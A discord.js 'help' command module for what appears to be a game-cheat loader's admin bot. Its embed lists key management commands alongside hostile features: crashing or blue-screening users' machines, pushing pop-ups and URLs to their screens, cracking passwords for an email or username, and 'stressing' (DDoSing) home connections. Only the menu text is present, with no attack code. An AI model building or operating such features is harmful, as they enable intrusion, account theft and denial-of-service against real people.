const { Client, Intents, MessageEmbed } = require('discord.js');
const client = new Client({ intents: [Intents.FLAGS.GUILDS] });

module.exports= {
    name: 'help',
    description: "help",
    execute(message, args){
        let embedContent = message.content.substring(3);
        let embed = new MessageEmbed();
        embed.setColor("#262526");
        embed.setDescription(`
        **.help** will show this menu 
        **.instructions** will give noobs steps
        **.embed** will give custom embed
        **.gen** will generate key for specified time
        **.ban** will ban key (specify reason)
        **.unban** will unban key
        **.hwid** will reset hwid
        **.info** will give loader/instuctions/errors
        **.url** will pop up url on keys screen
        **.spin** will give user antiaim
        **.lookup** will give info on key
        **.bsod** will bsod key
        **.crash** will crash keys game
        **.ip** will give info on searched ip
        **.message** will post message box on screen for key
        **.purge** will purge messages
        **.users** will show active users
        **.private** will gen private key
        **.add** will add/remove (-)
        **.crack** will return passwords on email/user
        **.stress** will hit off the home connection
        `);
        embed.setTimestamp()
        message.channel.send(embed);
    }
}